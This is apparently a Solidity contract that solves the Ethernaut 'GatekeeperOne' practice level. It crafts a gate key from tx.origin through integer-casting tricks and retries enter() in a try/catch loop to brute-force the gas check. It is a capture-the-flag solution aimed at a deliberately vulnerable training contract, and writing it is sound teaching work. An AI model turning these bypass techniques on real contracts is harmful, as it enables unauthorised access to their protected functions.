// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne gatekeeperOne;

    constructor(address _gatekeeper) {
        gatekeeperOne = IGatekeeperOne(_gatekeeper);
    }

    function attack() external {
        uint16 initalKey = uint16(uint160(tx.origin));
        uint64 key_uint64 = uint64(1 << 63) + uint64(initalKey); //Shifting bits for  uint32(uint64(_gateKey)) != uint64(_gateKey),

        bytes8 gateKey = bytes8(key_uint64);

        while (true) {
            try gatekeeperOne.enter(gateKey) {
                break;
            } catch {}
        }
    }
}
